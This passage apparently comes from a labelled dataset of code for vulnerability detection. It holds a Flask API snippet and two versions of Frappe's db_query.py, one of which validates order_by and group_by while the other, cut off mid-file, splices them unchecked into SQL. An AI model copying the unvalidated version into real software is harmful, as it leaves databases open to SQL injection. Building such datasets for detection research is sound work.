db.delete_object(class_name, note, uuid)\n\n        return j(\"Slettet {0}: {1}\".format(class_name, uuid)), 200\n\n    @classmethod\n    def create_api(cls, hierarchy, flask, base_url):\n        \"\"\"Set up API with correct database access functions.\"\"\"\n        hierarchy = hierarchy.lower()\n        class_name = cls.__name__.lower()\n        class_url = u\"{0}/{1}/{2}\".format(base_url,\n                                          hierarchy,\n                                          cls.__name__.lower())\n        uuid_regex = (\n            \"[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}\" +\n            \"-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\"\n        )\n        object_url = u'{0}/<regex(\"{1}\"):uuid>'.format(\n            class_url,\n            uuid_regex\n        )\n\n        flask.add_url_rule(class_url, u'_'.join([cls.__name__, 'get_objects']),\n                           cls.get_objects, methods=['GET'])\n\n        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'get_object']),\n                           cls.get_object, methods=['GET'])\n\n        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'put_object']),\n                           cls.put_object, methods=['PUT'])\n\n        flask.add_url_rule(\n            class_url, u'_'.join([cls.__name__, 'create_object']),\n            cls.create_object, methods=['POST']\n        )\n\n        flask.add_url_rule(\n            object_url, u'_'.join([cls.__name__, 'delete_object']),\n            cls.delete_object, methods=['DELETE']\n        )\n/n/n/n", "label": 1}, {"id": "049d51cdf17b06168b4fe7672be8ce01fff0edd2", "code": "frappe/model/db_query.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.list_settings import get_list_settings, update_list_settings\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,\n\t\tupdate=None, add_total_row=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\traise frappe.PermissionError, self.doctype\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], basestring):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.list_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_list_settings:\n\t\t\tself.save_list_settings_fields = save_list_settings_fields\n\t\t\tself.update_list_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t ' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tself.set_order_by(args, meta)\n\t\tself.validate_order_by_and_group_by_params(args.order_by, meta)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by_params(self.group_by, meta)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, basestring):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, basestring):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in fdict.iteritems():\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f): continue\n\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\traise frappe.PermissionError, doctype\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, basestring):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, basestring):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator in ('in', 'not in'):\n\t\t\tvalues = f.value\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator=='Between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\t\t\t\tvalue = \"'%s' AND '%s'\" % (\n\t\t\t\t\tget_datetime(f.value[0]).strftime(\"%Y-%m-%d %H:%M:%S.%f\"),\n\t\t\t\t\tadd_to_date(get_datetime(f.value[1]),days=1).strftime(\"%Y-%m-%d %H:%M:%S.%f\"))\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif df and df.fieldtype==\"Datetime\":\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator in (\"like\", \"not like\") or (isinstance(f.value, basestring) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator in (\"like\", \"not like\") and isinstance(value, basestring):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, basestring) and not f.operator=='Between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.defaults.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcondition = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tcondition += \"\"\" or `tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values])\n\t\t\t\t\t)\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args, meta):\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by_params(self, parameters, meta):\n\t\t\"\"\"\n\t\t\tClause cases:\n\t\t\t\t1. check for . to split table and columns and check for `tab prefix\n\t\t\t\t2. elif check field in meta\n\t\t\"\"\"\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.startswith(\"`tab\"):\n\t\t\t\ttbl = field.split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort\").format(tbl))\n\t\t\telse:\n\t\t\t\tfield = field.strip().split(' ')[0]\n\t\t\t\tif field not in [f.fieldname for f in meta.fields]:\n\t\t\t\t\tfrappe.throw(_(\"{0} invalid field in clause\").format(field))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_list_settings(self):\n\t\t# update list settings if new search\n\t\tlist_settings = json.loads(get_list_settings(self.doctype) or '{}')\n\t\tlist_settings['filters'] = self.filters\n\t\tlist_settings['limit'] = self.limit_page_length\n\t\tlist_settings['order_by'] = self.order_by\n\n\t\tif self.save_list_settings_fields:\n\t\t\tlist_settings['fields'] = self.list_settings_fields\n\n\t\tupdate_list_settings(self.doctype, list_settings)\n\n/n/n/n", "label": 0}, {"id": "049d51cdf17b06168b4fe7672be8ce01fff0edd2", "code": "/frappe/model/db_query.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.list_settings import get_list_settings, update_list_settings\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,\n\t\tupdate=None, add_total_row=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\traise frappe.PermissionError, self.doctype\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], basestring):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.list_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_list_settings:\n\t\t\tself.save_list_settings_fields = save_list_settings_fields\n\t\t\tself.update_list_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t ' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\t\tself.check_sort_by_table(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, basestring):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, basestring):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in fdict.iteritems():\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f): continue\n\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\traise frappe.PermissionError, doctype\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in 